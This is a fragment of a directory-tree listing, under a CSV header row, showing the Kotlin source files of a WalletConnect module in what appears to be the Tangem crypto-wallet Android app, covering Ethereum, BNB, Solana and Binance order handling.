id,title,username,language,date,content
│       │   │               │   ├── walletconnect
│       │   │               │   │   ├── BnbHelper.kt
│       │   │               │   │   ├── EthSignHelper.kt
│       │   │               │   │   └── WalletConnectSdkHelper.kt
│       │   │               │   └── walletconnect2
│       │   │               │       ├── app
│       │   │               │       │   ├── TangemWcBlockchainHelper.kt
│       │   │               │       │   └── WalletConnectEventsHandlerImpl.kt
│       │   │               │       ├── data
│       │   │               │       │   ├── DefaultLegacyWalletConnectRepository.kt
│       │   │               │       │   └── DefaultWalletConnectSessionsRepository.kt
│       │   │               │       ├── di
│       │   │               │       │   └── WalletConnectInteractorModule.kt
│       │   │               │       ├── domain
│       │   │               │       │   ├── LegacyWalletConnectRepository.kt
│       │   │               │       │   ├── mapper
│       │   │               │       │   │   └── SolanaTransactionMappings.kt
│       │   │               │       │   ├── models
│       │   │               │       │   │   ├── Account.kt
│       │   │               │       │   │   ├── binance
│       │   │               │       │   │   │   ├── WcBinanceCancelOrder.kt
│       │   │               │       │   │   │   ├── WcBinanceOrder.kt
│       │   │               │       │   │   │   ├── WcBinanceTradeOrder.kt
│       │   │               │       │   │   │   └── WcBinanceTransferOrder.kt
│       │   │               │       │   │   ├── BnbData.kt
│       │   │               │       │   │   ├── EthTransactionData.kt
│       │   │               │       │   │   ├── NetworkNamespace.kt
│       │   │               │       │   │   ├── RequestData.kt
│       │   │               │       │   │   ├── Session.kt
│       │   │               │       │   │   ├── solana
│       │   │               │       │   │   │   ├── SolanaSignMessage.kt
│       │   │               │       │   │   │   └── SolanaTransactionRequest.kt
│       │   │               │       │   │   ├── WalletConnectError.kt
│       │   │               │       │   │   ├── WalletConnectEvents.kt
│       │   │               │       │   │   └── WalletConnectSession.kt
│       │   │               │       │   ├── WalletConnectEventsHandler.kt
│       │   │               │       │   ├── WalletConnectInteractor.kt
